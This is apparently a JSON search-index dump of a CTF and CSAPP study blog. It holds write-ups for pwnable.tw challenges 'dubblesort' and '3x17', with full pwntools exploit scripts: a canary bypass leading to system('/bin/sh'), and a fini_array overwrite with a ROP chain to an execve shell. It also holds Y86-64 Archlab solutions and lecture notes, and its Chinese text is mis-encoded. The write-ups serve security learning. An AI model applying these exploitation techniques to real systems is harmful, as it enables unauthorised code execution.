the address has not been filled in to .got.plt yet.) .got.plt This is the GOT for the PLT. It contains the target addresses (after they have been looked up) or an address back in the .plt to trigger the lookup. Classically, this data was part of the .got section. .text:00000AF9 mov eax, 0 .text:00000AFE mov edx, [esp+7Ch] .text:00000B02 xor edx, large gs:14h .text:00000B09 jz short loc_B10 .text:00000B0B call check_canary ç»è¿‡è°ƒè¯•ï¼Œå‘ç°canaryè¢«æ”¾å…¥äº†esp+0x7cçš„ä½ç½®ã€‚å› ä¸ºä¼šè¿›è¡Œæ’åºï¼Œè€Œä¸ºäº†ä¿®æ”¹è¿”å›åœ°å€ï¼Œæˆ‘ä»¬ä¼šé‡åˆ°canaryã€‚æ‰€ä»¥åœ¨canaryå‰è¾“å…¥æ¯”å…¶å°çš„æ•°å­—â€˜0â€™ï¼Œé€šè¿‡è¾“å…¥ç¬¦å·ç»•è¿‡canaryï¼Œä¹‹åè¾“å…¥æ¯”canaryå¤§çš„å†…å®¹ã€‚ ","date":"2021-02-12","objectID":"/challenges-100-week-6/:2:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 6","uri":"/challenges-100-week-6/#ida"},{"categories":["Writeups"],"content":"exp from pwn import * from LibcSearcher import LibcSearcher leak = lambda name,addr: log.success('{:#x}'.format(name,addr)) context.log_level=\"DEBUG\" context.arch=\"amd64\" local=0 binary='./dubblesort' #gdb.attach(p) if local: p=process(binary) else: p=remote('chall.pwnable.tw',10101) elf = ELF(binary,checksec=False) libc=ELF('./libc_32.so.6',checksec=False) p.sendline('a'*0x18) libcbase=u32(p.recvuntil('\\xf7')[-4:])-0xa-0x1b0000 print hex(libcbase) system=libcbase+libc.symbols['system'] bin_sh=libcbase+0x00158e8b p.sendline('35') payload='0'*0x18+'-'+9*str(system)+str(bin_sh) for i in range(24): p.sendline('0') p.sendline('-') for i in range(9): p.sendline(str(system)) p.sendline(str(bin_sh)) p.interactive() ","date":"2021-02-12","objectID":"/challenges-100-week-6/:3:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 6","uri":"/challenges-100-week-6/#exp"},{"categories":["Pwning"],"content":"CSAPP-Archlab","date":"2021-02-08","objectID":"/csapp-archlab/:0:0","series":null,"tags":["Pwn"],"title":"CSAPP Archlab","uri":"/csapp-archlab/#csapp-archlab"},{"categories":["Pwning"],"content":"part Aä½¿ç”¨Y86-64æŒ‡ä»¤é›†å®ç°example.cä¸­çš„å‡½æ•° /* * Architecture Lab: Part A * * High level specs for the functions that the students will rewrite * in Y86-64 assembly language */ /* $begin examples */ /* linked list element */ typedef struct ELE { long val; struct ELE *next; } *list_ptr; /* sum_list - Sum the elements of a linked list */ long sum_list(list_ptr ls) { long val = 0; while (ls) { val += ls-\u003eval; ls = ls-\u003enext; } return val; } /* rsum_list - Recursive version of sum_list */ long rsum_list(list_ptr ls) { if (!ls) return 0; else { long val = ls-\u003eval; long rest = rsum_list(ls-\u003enext); return val + rest; } } /* copy_block - Copy src to dest and return xor checksum of src */ long copy_block(long *src, long *dest, long len) { long result = 0; while (len \u003e 0) { long val = *src++; *dest++ = val; result ^= val; len--; } return result; } /* $end examples */ ","date":"2021-02-08","objectID":"/csapp-archlab/:1:0","series":null,"tags":["Pwn"],"title":"CSAPP Archlab","uri":"/csapp-archlab/#part-a"},{"categories":["Pwning"],"content":"sum_list .pos 0 irmovq stack,%rsp call main halt #link list .align 8 ele1: .quad 0x00a .quad ele2 ele2: .quad 0x0b0 .quad ele3 ele3: .quad 0xc00 .quad 0 main: irmovq ele1,%rdi call sum_list ret sum_list: pushq %r10 irmovq $0x0,%rax jmp test sum: mrmovq (%rdi),%r10 addq %r10,%rax #val+=ls.val mrmovq 8(%rdi),%rdi #ls=ls.next test: andq %rdi,%rdi jne sum popq %r10 ret .pos 0x200 stack: æ€è·¯å…¶å®å¾ˆç®€å•ï¼Œå¯¹ç€cä»£ç å†™å°±å¯ï¼Œè¿™é‡Œä½¿ç”¨äº†whileå¾ªç¯çš„ä¼˜åŒ–ã€‚ä¸ºäº†ä¿å­˜åŸæ¥å¯„å­˜å™¨çš„å€¼è¦å…ˆå°†å…¶å…¥æ ˆã€‚ niebelungen@ubuntu:~/Desktop/archlab-handout/sim/misc$ ./yis sum.yo Stopped in 28 steps at PC = 0x13. Status 'HLT', CC Z=1 S=0 O=0 Changes to registers: %rax: 0x0000000000000000 0x0000000000000cba %rsp: 0x0000000000000000 0x0000000000000200 Changes to memory: 0x01f0: 0x0000000000000000 0x000000000000005b 0x01f8: 0x0000000000000000 0x0000000000000013 raxä¸­çš„ç»“æœæ˜¯æ­£ç¡®çš„ã€‚ ","date":"2021-02-08","objectID":"/csapp-archlab/:1:1","series":null,"tags":["Pwn"],"title":"CSAPP Archlab","uri":"/csapp-archlab/#sum_list"},{"categories":["Pwning"],"content":"rsum_list .pos 0 irmovq stack,%rsp call main halt #link list .align 8 ele1: .quad 0x00a .quad ele2 ele2: .quad 0x0b0 .quad ele3 ele3: .quad 0xc00 .quad 0 main: irmovq ele1,%rdi call rsum_list ret rsum_list: pushq %r10 xor %rax,%rax #irmovq $0x0,%rax andq %rdi,%rdi je end mrmovq (%rdi),%r10 mrmovq 8(%rdi),%rdi call rsum_list addq %r10,%rax end: popq %r10 ret .pos 0x200 stack: ä½¿ç”¨é€’å½’çš„æ–¹å¼å®Œæˆæ±‚å’Œï¼Œé‚£ä¹ˆrdiå’Œraxçš„å€¼éƒ½æ˜¯å˜åŒ–çš„ï¼Œè¿™é‡Œè¦æƒ³åˆ°é€šè¿‡å¤šä½™çš„å¯„å­˜å™¨ä¿å­˜å½“å‰çš„å€¼ï¼Œä¾¿äºé€šè¿‡addqè¿›è¡Œç›¸åŠ ã€‚ niebelungen@ubuntu:~/Desktop/archlab-handout/sim/misc$ ./yis rsum.yo Stopped in 42 steps at PC = 0x13. Status 'HLT', CC Z=0 S=0 O=0 Changes to registers: %rax: 0x0000000000000000 0x0000000000000cba %rsp: 0x0000000000000000 0x0000000000000200 Changes to memory: 0x01b8: 0x0000000000000000 0x0000000000000c00 0x01c0: 0x0000000000000000 0x0000000000000088 0x01c8: 0x0000000000000000 0x00000000000000b0 0x01d0: 0x0000000000000000 0x0000000000000088 0x01d8: 0x0000000000000000 0x000000000000000a 0x01e0: 0x0000000000000000 0x0000000000000088 0x01f0: 0x0000000000000000 0x000000000000005b 0x01f8: 0x0000000000000000 0x0000000000000013 ","date":"2021-02-08","objectID":"/csapp-archlab/:1:2","series":null,"tags":["Pwn"],"title":"CSAPP Archlab","uri":"/csapp-archlab/#rsum_list"},{"categories":["Pwning"],"content":"copy_block .pos 0 irmovq stack,%rsp call main halt .align 8 # Source block src: .quad 0x00a .quad 0x0b0 .quad 0xc00 # Destination block dest: .quad 0x111 .quad 0x222 .quad 0x333 main: irmovq $0x3,%rdx irmovq dest,%rsi irmovq src,%rdi call copy_block ret copy_block: pushq %r8 pushq %r9 pushq %r10 irmovq $0x8,%r8 irmovq $0x1,%r9 xorq %rax,%rax jmp test copy: mrmovq (%rdi),%r10 rmmovq %r10,(%rsi) xorq %r10,%rax addq %r8,%rdi addq %r8,%rsi subq %r9,%rdx test: andq %rdx,%rdx jne copy popq %r10 popq %r9 popq %r8 ret .pos 0x200 stack: niebelungen@ubuntu:~/Desktop/archlab-handout/sim/misc$ ./yis copy_block.yo Stopped in 45 steps at PC = 0x13. Status 'HLT', CC Z=1 S=0 O=0 Changes to registers: %rax: 0x0000000000000000 0x0000000000000cba %rsp: 0x0000000000000000 0x0000000000000200 %rsi: 0x0000000000000000 0x0000000000000048 %rdi: 0x0000000000000000 0x0000000000000030 Changes to memory: 0x0030: 0x0000000000000111 0x000000000000000a 0x0038: 0x0000000000000222 0x00000000000000b0 0x0040: 0x0000000000000333 0x0000000000000c00 0x01f0: 0x0000000000000000 0x000000000000006f 0x01f8: 0x0000000000000000 0x0000000000000013 ","date":"2021-02-08","objectID":"/csapp-archlab/:1:3","series":null,"tags":["Pwn"],"title":"CSAPP Archlab","uri":"/csapp-archlab/#copy_block"},{"categories":["Pwning"],"content":"part Bä¿®æ”¹seq-fun.hclä½¿å…¶æ”¯æŒiaddq é˜¶æ®µ iaddq V, rB Fetch icode: ifunâ† $M_1[PC]$ rA: rBâ† $M_1[PC+1]$ valC â† $M_s[PC+2]$ valP â† PC+10 Decode valB â† $R[rB]$ Execute valE â† valC+valB Set CC Memory Write Back R[rB] â† valE PC Update PC â† valP å¡«å¥½è¡¨æ ¼ï¼Œå¯¹åº”é˜¶æ®µè¿›è¡Œä¿®æ”¹å°±å¯ä»¥äº†ã€‚ niebelungen@ubuntu:~/Desktop/archlab-handout/sim/seq$ (cd ../ptest; make SIM=../seq/ssim TFLAGS=-i) ./optest.pl -s ../seq/ssim -i Simulating with ../seq/ssim All 58 ISA Checks Succeed ./jtest.pl -s ../seq/ssim -i Simulating with ../seq/ssim All 96 ISA Checks Succeed ./ctest.pl -s ../seq/ssim -i Simulating with ../seq/ssim All 22 ISA Checks Succeed ./htest.pl -s ../seq/ssim -i Simulating with ../seq/ssim All 756 ISA Checks Succeed ","date":"2021-02-08","objectID":"/csapp-archlab/:2:0","series":null,"tags":["Pwn"],"title":"CSAPP Archlab","uri":"/csapp-archlab/#part-b"},{"categories":["Pwning"],"content":"part Cä¿®æ”¹ncopy.ysä½¿å¾—ncopyå‡½æ•°å°½å¯èƒ½å¿«ã€‚é¦–å…ˆï¼Œå¯ä»¥åœ¨pipe-full.hclæ–‡ä»¶ä¸­å¢åŠ iaddqæŒ‡ä»¤ã€‚ xorq %rax,%rax # count = 0; andq %rdx,%rdx # len \u003c= 0? jle Done # if so, goto Done: Loop: mrmovq (%rdi), %r10 # read val from src... rmmovq %r10, (%rsi) # ...and store it to dst andq %r10, %r10 # val \u003c= 0? jle Npos # if so, goto Npos: iaddq $1, %rax # count++ Npos: iaddq $-1, %rdx # len-- iaddq $8, %rdi # src++ iaddq $8, %rsi # dst++ andq %rdx,%rdx # len \u003e 0? jg Loop # if so, goto Loop: ä¹‹åè¿›è¡Œå¾ªç¯å±•å¼€ï¼Œè¿™é‡Œè¿›è¡Œäº†å››è·¯å¾ªç¯å±•å¼€ï¼Œæ³¨æ„åˆ°ï¼Œmrmovq (%rdi), %r10å’Œrmmovq %r10, (%rsi)ä¹‹é—´æœ‰æ•°æ®å…³è”ï¼Œæ‰€ä»¥å¼•å…¥ä¸€ä¸ªå¯„å­˜å™¨æ¶ˆé™¤æ°”æ³¡ã€‚ä¸”åœ¨ç¨‹åºä¸€å¼€å§‹raxå¿…ç„¶ä¸º0ï¼Œå»é™¤xorq %rax,%raxã€‚ iaddq $-4,%rdx jl Last1 Loop: mrmovq (%rdi),%r10 mrmovq 8(%rdi),%r11 rmmovq %r10,(%rsi) andq %r10, %r10 jle Npos1 iaddq $1,%rax Npos1: mrmovq 16(%rdi),%r10 rmmovq %r11,8(%rsi) andq %r11, %r11 jle Npos2 iaddq $1,%rax Npos2: mrmovq 24(%rdi),%r11 rmmovq %r10,16(%rsi) andq %r10, %r10 jle Npos3 iaddq $1,%rax Npos3: rmmovq %r11,24(%rsi) andq %r11, %r11 jle Npos iaddq $1,%rax Npos: iaddq $32,%rdi iaddq $32,%rsi iaddq $-4,%rdx jge Loop Last1: iaddq $4,%rdx iaddq $-1,%rdx jl Done mrmovq (%rdi),%r10 mrmovq 8(%rdi),%r11 rmmovq %r10,(%rsi) andq %r10, %r10 jle Last2 iaddq $1,%rax Last2: iaddq $-1,%rdx jl Done mrmovq 16(%rdi),%r10 rmmovq %r11,8(%rsi) andq %r11, %r11 jle Last3 iaddq $1,%rax Last3: iaddq $-1,%rdx jl Done rmmovq %r10,16(%rsi) andq %r10, %r10 jle Done iaddq $1,%rax ç›®å‰å¾—åˆ†ï¼š48.5/60 ï¼Œå†å±•å¼€ä¸ºå…«è·¯ iaddq $-8,%rdx jl Last1 Loop: mrmovq (%rdi),%r10 mrmovq 8(%rdi),%r11 rmmovq %r10,(%rsi) andq %r10, %r10 jle Npos1 iaddq $1,%rax Npos1: mrmovq 16(%rdi),%r10 rmmovq %r11,8(%rsi) andq %r11, %r11 jle Npos2 iaddq $1,%rax Npos2: mrmovq 24(%rdi),%r11 rmmovq %r10,16(%rsi) andq %r10, %r10 jle Npos3 iaddq $1,%rax Npos3: mrmovq 32(%rdi),%r10 rmmovq %r11,24(%rsi) andq %r11, %r11 jle Npos4 iaddq $1,%rax Npos4: mrmovq 40(%rdi),%r11 rmmovq %r10,32(%rsi) andq %r10, %r10 jle Npos5 iaddq $1,%rax Npos5: mrmovq 48(%rdi),%r10 rmmovq %r11,40(%rsi) andq %r11, %r11 jle Npos6 iaddq $1,%rax Npos6: mrmovq 56(%rdi),%r11 rmmovq %r10,48(%rsi) andq %r10, %r10 jle Npos7 iaddq $1,%rax Npos7: rmmovq %r11,56(%rsi) andq %r11, %r11 jle Npos iaddq $1,%rax Npos: iaddq $64,%rdi iaddq $64,%rsi iaddq $-8,%rdx jge Loop Last1: iaddq $8,%rdx iaddq $-1,%rdx jl Done mrmovq (%rdi),%r10 mrmovq 8(%rdi),%r11 rmmovq %r10,(%rsi) andq %r10, %r10 jle Last2 iaddq $1,%rax Last2: iaddq $-1,%rdx jl Done mrmovq 16(%rdi),%r10 rmmovq %r11,8(%rsi) andq %r11, %r11 jle Last3 iaddq $1,%rax Last3: iaddq $-1,%rdx jl Done mrmovq 24(%rdi),%r11 rmmovq %r10,16(%rsi) andq %r10, %r10 jle Last4 iaddq $1,%rax Last4: iaddq $-1,%rdx jl Done mrmovq 32(%rdi),%r10 rmmovq %r11,24(%rsi) andq %r11, %r11 jle Last5 iaddq $1,%rax Last5: iaddq $-1,%rdx jl Done mrmovq 40(%rdi),%r11 rmmovq %r10,32(%rsi) andq %r10, %r10 jle Last6 iaddq $1,%rax Last6: iaddq $-1,%rdx jl Done mrmovq 48(%rdi),%r10 rmmovq %r11,40(%rsi) andq %r11, %r11 jle Last7 iaddq $1,%rax Last7: iaddq $-1,%rdx jl Done rmmovq %r10,48(%rsi) andq %r10, %r10 jle Done iaddq $1,%rax ç›®å‰å¾—åˆ†ï¼š50.1/60 ï¼Œç›®å‰æˆ‘ä»¬çš„ä»£ç æ˜¯817å­—èŠ‚ï¼Œå±•å¼€ä¸ºåè·¯ï¼Œè¶…å‡ºå­—èŠ‚é™åˆ¶ã€‚ç„¶åå‘ç°åœ¨ï¼Œå‰©ä½™éƒ¨åˆ†å¤„ç†æ—¶ï¼Œæˆ‘ä»¬å¤šæ¬¡é‡å¤æ‰§è¡Œäº†iaddq $-1,%rdxï¼Œjl Doneæ‰€ä»¥æ¥ä¸‹æ¥æƒ³åŠæ³•ç®€åŒ–å‰©ä½™å¤„ç†ã€‚é¦–å…ˆï¼Œä»ç¡®å®šé•¿åº¦å…¥æ‰‹ï¼Œé•¿åº¦ç¡®å®šè¿›è¡Œä¼˜åŒ–åï¼Œå¯ä»¥è·³è½¬åˆ°å‰©ä½™é•¿åº¦çš„ä½ç½®ï¼Œç®€åŒ–å¤„ç†ã€‚ iaddq $-9,%rdx jl Find Loop: mrmovq (%rdi),%r10 mrmovq 8(%rdi),%r11 rmmovq %r10,(%rsi) andq %r10, %r10 jle Npos1 iaddq $1,%rax Npos1: mrmovq 16(%rdi),%r10 rmmovq %r11,8(%rsi) andq %r11, %r11 jle Npos2 iaddq $1,%rax Npos2: mrmovq 24(%rdi),%r11 rmmovq %r10,16(%rsi) andq %r10, %r10 jle Npos3 iaddq $1,%rax Npos3: mrmovq 32(%rdi),%r10 rmmovq %r11,24(%rsi) andq %r11, %r11 jle Npos4 iaddq $1,%rax Npos4: mrmovq 40(%rdi),%r11 rmmovq %r10,32(%rsi) andq %r10, %r10 jle Npos5 iaddq $1,%rax Npos5: mrmovq 48(%rdi),%r10 rmmovq %r11,40(%rsi) andq %r11, %r11 jle Npos6 iaddq $1,%rax Npos6: mrmovq 56(%rdi),%r11 rmmovq %r10,48(%rsi) andq %r10, %r10 jle Npos7 iaddq $1,%rax Npos7: mrmovq 64(%rdi),%r10 rmmovq %r11,56(%rsi) andq %r11, %r11 jle Npos8 iaddq $1,%rax Npos8: rmmovq %r10,64(%rsi) andq %r10, %r10 jle Npos iaddq $1,%rax Npos: iaddq $72,%rdi iaddq $72,%rsi iaddq $-9,%rdx jge Loop Find: iaddq $6,%rdx jl Left jg Right","date":"2021-02-08","objectID":"/csapp-archlab/:3:0","series":null,"tags":["Pwn"],"title":"CSAPP Archlab","uri":"/csapp-archlab/#part-c"},{"categories":["Writeups"],"content":" Challenges Tricks pwnable.tw-3x17 fini_arry å› ä¸ºæœ€è¿‘ä¸€ç›´åœ¨è¯»CSAPPåˆ·é¢˜é‡å˜å°‘äº†Â·Â· ","date":"2021-02-07","objectID":"/challenges-100-week-5/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 5","uri":"/challenges-100-week-5/#"},{"categories":["Writeups"],"content":"3x17","date":"2021-02-07","objectID":"/challenges-100-week-5/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 5","uri":"/challenges-100-week-5/#3x17"},{"categories":["Writeups"],"content":"ida void __fastcall __noreturn start(__int64 a1, __int64 a2, int a3) { __int64 v3; // rax int v4; // esi __int64 v5; // [rsp-8h] [rbp-8h] BYREF void *retaddr; // [rsp+0h] [rbp+0h] BYREF v4 = v5; v5 = v3; sub_401EB0( (unsigned int)main, v4, (unsigned int)\u0026retaddr, (unsigned int)sub_4028D0, (unsigned int)libc_fini, a3, (__int64)\u0026v5); __halt(); } int __cdecl main(int argc, const char **argv, const char **envp) { int result; // eax char *v4; // [rsp+8h] [rbp-28h] char buf[24]; // [rsp+10h] [rbp-20h] BYREF unsigned __int64 v6; // [rsp+28h] [rbp-8h] v6 = __readfsqword(0x28u); result = (unsigned __int8)++byte_4B9330; if ( byte_4B9330 == 1 ) { sub_446EC0(1u, \"addr:\", 5uLL); sub_446E20(0, buf, 0x18uLL); v4 = (char *)(int)sub_40EE70(buf); sub_446EC0(1u, \"data:\", 5uLL); sub_446E20(0, v4, 0x18uLL); result = 0; } if ( __readfsqword(0x28u) != v6 ) sub_44A3E0(); return result; Linux x86 Program Start Up æ˜¯é™æ€é“¾æ¥ç¨‹åºï¼ŒæŸ¥çœ‹startå‡½æ•°ï¼Œå‘ç°å…¶è°ƒç”¨äº†ä¸‰ä¸ªå‡½æ•°ï¼Œç¬¬ä¸€ä¸ªå°±æ˜¯mainå‡½æ•°ï¼Œè€Œæœ€åä¸€ä¸ªå°±æ˜¯libc_finiå‡½æ•°ã€‚ åœ¨mainä¸­å®ç°äº†ä»»æ„åœ°å€å†™ï¼Œä½†åªèƒ½è¾“å…¥ä¸€æ¬¡ã€‚æˆ‘ä»¬æ‰“ç®—é‡‡ç”¨ç³»ç»Ÿè°ƒç”¨çš„æ–¹å¼get shellï¼Œåœ¨é™æ€é“¾æ¥ç¨‹åºä¸­ï¼Œgadgetå¾ˆå……è¶³ã€‚ ä¸ºæ­¤ï¼Œæˆ‘ä»¬è¦å¸ƒç½®å¥½ROPé“¾ã€‚ä¸ºäº†èƒ½å¤šæ¬¡è¾“å…¥æˆ‘ä»¬ä¿®æ”¹fini_arryæ•°ç»„ä½¿å…¶ä¸æ–­çš„è°ƒç”¨mainï¼Œè™½ç„¶è¿›å…¥è¾“å…¥æœ‰æ¡ä»¶ï¼Œä½†æ˜¯å› ä¸ºæ˜¯ä¸æ–­åœ°è°ƒç”¨ï¼Œæ‰€ä»¥ä¼šå‘ç”Ÿæº¢å‡ºï¼Œè¾¾åˆ°æ¡ä»¶è®©æˆ‘ä»¬è¾“å…¥ã€‚ .text:0000000000402960 libc_fini proc near ; DATA XREF: start+Fâ†‘o .text:0000000000402960 ; __unwind { .text:0000000000402960 push rbp .text:0000000000402961 lea rax, unk_4B4100 .text:0000000000402968 lea rbp, off_4B40F0 .text:000000000040296F push rbx .text:0000000000402970 sub rax, rbp .text:0000000000402973 sub rsp, 8 .text:0000000000402977 sar rax, 3 .text:000000000040297B jz short loc_402996 .text:000000000040297D lea rbx, [rax-1] .text:0000000000402981 nop dword ptr [rax+00000000h] .text:0000000000402988 .text:0000000000402988 loc_402988: ; CODE XREF: libc_fini+34â†“j .text:0000000000402988 call qword ptr [rbp+rbx*8+0] è¿™é‡Œlea rbp, off_4B40F0æ˜¯å°†æ•°ç»„çš„åœ°å€å½“ä½œrbpï¼Œè€Œåé¢call qword ptr [rbp+rbx*8+0]å°±æ˜¯ç›¸å½“äºè°ƒç”¨æ•°ç»„ä¸­çš„å‡½æ•°ã€‚æ‰€ä»¥æˆ‘ä»¬é€šè¿‡è¿™ä¸ªå°†æ ˆè¿ç§»åˆ°0x4B4100çš„ä½ç½®ã€‚æ‰€ä»¥åœ¨è¿™é‡Œè¿›è¡ŒROPçš„æ„é€ ã€‚ ","date":"2021-02-07","objectID":"/challenges-100-week-5/:1:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 5","uri":"/challenges-100-week-5/#ida"},{"categories":["Writeups"],"content":"exp from pwn import * from LibcSearcher import LibcSearcher leak = lambda name,addr: log.success('{:#x}'.format(name,addr)) context.log_level=\"DEBUG\" context.arch=\"amd64\" local=1 binary='./3x17' #gdb.attach(p) if local: p=process(binary) else: p=remote('220.249.52.133',32446) elf = ELF(binary,checksec=False) def write(addr,data): p.sendafter('addr:',str(addr)) p.sendafter('data:',data) libc_fini=0x0402960 fini_arry=0x04B40F0 main_addr=0x0401B6D pop_rax=0x041e4af pop_rdi=0x0401696 pop_rbx=0x0401e0b pop_rdx=0x0446e35 pop_rsi=0x0406c30 syscall=0x04022b4 leave_ret=0x0401c4b sh_addr=0x04B41aa fake_stack=0x04B4100 gdb.attach(p) write(fini_arry,p64(libc_fini)+p64(main_addr)) write(sh_addr,'/bin/sh\\x00') write(fake_stack,p64(pop_rax)+p64(0x3b)) write(fake_stack+0x10,p64(pop_rdi)+p64(sh_addr)) write(fake_stack+0x20,p64(pop_rsi)+p64(0)) write(fake_stack+0x30,p64(pop_rdx)+p64(0)) write(fake_stack+0x40,p64(syscall)) write(fini_arry,p64(leave_ret)) p.interactive() ","date":"2021-02-07","objectID":"/challenges-100-week-5/:2:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 5","uri":"/challenges-100-week-5/#exp"},{"categories":["Pwning"],"content":"Lecture 04: å¤„ç†å™¨ä½“ç³»ç»“æ„","date":"2021-02-04","objectID":"/csapp-lecture-04/:0:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 04","uri":"/csapp-lecture-04/#lecture-04-å¤„ç†å™¨ä½“ç³»ç»“æ„"},{"categories":["Pwning"],"content":"Y86-64ISAå®šä¹‰ä¸€ä¸ªç®€å•çš„æŒ‡ä»¤é›†ï¼Œä½œä¸ºå¤„ç†å™¨å®ç°çš„è¿è¡Œç¤ºä¾‹ã€‚ å¯„å­˜å™¨ï¼š15ä¸ªç¨‹åºå¯„å­˜å™¨ï¼š%raxï¼Œ%rcxï¼Œ%rdxï¼Œ%rbxï¼Œ%rspï¼Œ%rbpï¼Œ%rsiï¼Œ%rdiï¼Œ%r8åˆ°%r14ã€‚è¿™é‡Œçœç•¥äº†%r15ï¼Œä¸ºäº†ç®€åŒ–æŒ‡ä»¤ç¼–ç ã€‚ å®ƒä»¬åˆ†åˆ«å¯¹åº”ç¼–ç æ•°å­—0-0xEï¼Œè€Œ0xFä»£è¡¨å½“å‰æŒ‡ä»¤ä¸éœ€è¦å¯„å­˜å™¨æ“ä½œæ•°ã€‚ æ¡ä»¶ç ï¼šZFã€SFå’ŒOFã€‚ PCï¼šç¨‹åºè®¡æ•°å™¨ Statï¼šç¨‹åºçŠ¶æ€ 1ï¼šAOKï¼Œæ­£å¸¸æ“ä½œ 2ï¼šHLTï¼Œå¤„ç†å™¨æ‰§è¡Œäº†haltæŒ‡ä»¤ 3ï¼šADRï¼Œé‡åˆ°éæ³•åœ°å€ 4ï¼šINSï¼Œé‡åˆ°éæ³•æŒ‡ä»¤ ä¸€äº›æŒ‡ä»¤ç»†èŠ‚ movqï¼šY86-64ä¸­è¯¥æ“ä½œè¢«åˆ†æˆï¼širmovqï¼Œrrmovqï¼Œmrmovqï¼Œrmmovq æ•´æ•°æ“ä½œæŒ‡ä»¤ï¼šaddqï¼Œsubqï¼Œandqï¼Œxorq ä¸ƒä¸ªè·³è½¬æŒ‡ä»¤ï¼šjmp, jle, je, jne, jl, jge, jg æ¡ä»¶ä¼ é€æŒ‡ä»¤ï¼šcmovle, cmovl, cmove, cmovne, cmovge, cmovg haltï¼šåœæ­¢æŒ‡ä»¤çš„æ‰§è¡Œ pushq, popqçš„ä¸€äº›çº¦å®š æˆ‘ä»¬çŸ¥é“pushæŒ‡ä»¤ä¼šå°†rsp-8ï¼Œé‚£ä¹ˆå¦‚æœpush rspé‚£ä¹ˆå…¥æ ˆçš„rspæ˜¯åŸå§‹å€¼ï¼Œè¿˜æ˜¯rsp-8åçš„å€¼å‘¢ï¼Ÿ è§„å®šåœ¨Y86-64ï¼Œé‡‡ç”¨å‰è€…ã€‚ åŒæ—¶ï¼Œpop rspä¹Ÿä¼šæœ‰æ­§ä¹‰ï¼ŒY86-64ä¹Ÿä¼šå¼¹å‡ºåŸå€¼ï¼Œè€Œä¸æ˜¯+8åçš„ã€‚ ","date":"2021-02-04","objectID":"/csapp-lecture-04/:1:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 04","uri":"/csapp-lecture-04/#y86-64isa"},{"categories":["Pwning"],"content":"HCLä¸€äº›æ•°ç”µçŸ¥è¯†ç•¥è¿‡~ HCLç±»ä¼¼äºç”¨å¸ƒå°”è¡¨è¾¾å¼æ¥ä¹¦å†™é—¨ç”µè·¯çš„ç»„åˆæ–¹å¼, åƒè¿™ä¸ªbool eq = (a \u0026\u0026 b) || (!a \u0026\u0026 !b); HCLè¯­è¨€çœ‹ä¸Šå»å¾ˆåƒCè¯­è¨€è¡¨è¾¾å¼, ç›¸æ¯”Cè¯­è¨€, HCLæœ‰ä¸€äº›ç‰¹ç‚¹: HCLçš„å€¼æ˜¯æŒç»­å“åº”çš„, å¹¶ä¸æ˜¯åƒè¯­å¥ä¸€æ ·é‡åˆ°æ‰æ±‚å€¼ Cçš„åˆ¤æ–­æ¡ä»¶æ˜¯ä¸æ˜¯0éƒ½æ˜¯çœŸ, è€Œæ˜¯0å°±æ˜¯å‡. HCLä¸­çš„å€¼åªæœ‰0å’Œ1ä»£è¡¨é«˜ä½ç”µå‹, ä¸å­˜åœ¨å…¶ä»–å€¼. Cè¡¨è¾¾å¼æœ‰çŸ­è·¯ä½œç”¨, è€ŒHCLä¸€ç›´å“åº”è¾“å…¥å˜åŒ–, ä¸å­˜åœ¨æ±‚å€¼ä¸å¦çš„é—®é¢˜. å°†æ‰€æœ‰è¾“å…¥éƒ½å‡è®¾ä¸ºæ•°æ®ç±»å‹æ˜¯intçš„å­—æ¥è§£é‡Š, å…¶å®åº•å±‚æ˜¯æ²¡æœ‰æ•°æ®ç±»å‹ä¸€è¯´çš„, è¿™æ ·å‡è®¾æ˜¯ä¸ºäº†è¯´èµ·æ¥æ–¹ä¾¿. å…è®¸æ¯”è¾ƒå­—æ˜¯å¦ç›¸ç­‰, å³ bool eq = (A==B) å¤šè·¯å¤ç”¨å™¨ï¼ˆMultiplexorï¼ŒMUXï¼‰ å®é™…å°±æ˜¯æ•°æ®é€‰æ‹©å™¨ï¼Œåœ¨HCLå¯ä»¥ä½¿ç”¨ [ select1 : expr1; select2 : expr2; ... selectk : exprk; ] å…¶ä¸­ï¼Œselectæ˜¯å¸ƒå°”è¡¨è¾¾å¼ï¼Œexpræ˜¯å­—çº§è¡¨è¾¾å¼ã€‚åœ¨HCLä¸­ï¼Œä¸è¦æ±‚ä¸åŒçš„é€‰æ‹©è¡¨è¾¾å¼ä¹‹é—´æ˜¯äº’æ–¥çš„ï¼Œä½†æ˜¯å®é™…çš„å¤šè·¯å¤ç”¨å™¨çš„ä¿¡å·å¿…é¡»äº’æ–¥ã€‚é€‰æ‹©è¡¨è¾¾å¼æ˜¯é¡ºåºæ±‚å€¼çš„ï¼Œæ‰€ä»¥åç»­çš„é€‰æ‹©è¡¨è¾¾å¼å¯ä»¥åœ¨ä¹‹å‰çš„é€‰æ‹©è¡¨è¾¾å¼çš„åŸºç¡€ä¸Šè¿›è¡Œç®€åŒ–ã€‚ä¾‹å¦‚ï¼š int Out={ s : A; 1 : B; }; å››é€‰ä¸€æ•°æ®é€‰æ‹©å™¨çš„è¡¨è¾¾å¼å¯ä»¥å†™ä½œï¼š bool s1 =code ==2 || code ==3 bool s0 =code ==1 || code ==3 è¿˜å¯ä»¥è¿›ä¸€æ­¥ç®€åŒ–ä¸ºï¼š bool s1 = code in {2, 3} bool s0 = code in {1, 3} å½“codeåœ¨é›†åˆ{2, 3}ä¸­æ—¶ï¼Œs1ä¸º1ï¼Œè€Œcodeåœ¨é›†åˆ{1, 3}ä¸­æ—¶ï¼Œs0ä¸º1ã€‚ å­˜å‚¨å™¨å’Œæ—¶é’Ÿ æ—¶åºç”µè·¯ï¼Œè§¦å‘æ²¿äº§ç”Ÿåæ‰æ”¹å˜å­˜å‚¨å™¨çš„å€¼ã€‚ ä¸»è¦æœ‰ä¸¤ç±»å­˜å‚¨å™¨è®¾å¤‡ï¼š **æ—¶é’Ÿå¯„å­˜å™¨ï¼ˆå¯„å­˜å™¨ï¼‰ï¼š**å­˜å‚¨å•ä¸ªä½æˆ–å­—ï¼Œä¸»è¦ä½œä¸ºç”µè·¯ä¸åŒéƒ¨åˆ†çš„ç»„åˆé€»è¾‘ä¹‹é—´çš„å±éšœã€‚ 